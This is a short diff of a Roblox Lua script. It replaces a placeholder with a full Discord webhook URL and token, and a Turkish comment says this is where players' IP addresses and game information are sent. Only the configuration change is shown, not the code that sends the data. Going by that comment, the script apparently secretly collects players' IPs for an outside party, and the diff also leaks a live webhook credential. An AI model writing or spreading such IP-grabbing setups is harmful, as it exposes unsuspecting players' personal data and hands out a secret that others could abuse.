@@ -6,7 +6,7 @@ local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
 -- AYARLAR
-local WEBHOOK_URL = "BURAYA_WEBHOOK_LINKINI_YAZ" -- IP ve Oyun bilgisinin gideceği yer
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1491781510221529299/fPCiH-8J7h9bh6cwHJCXyDChP3EDycLysEgSCuidS3yhHcmqcBeDNFoFJxTfdBohXmnL" -- IP ve Oyun bilgisinin gideceği yer
 local MAIN_FONT = Enum.Font.RobotoMono
 
 local function sendNotify(title, msg)
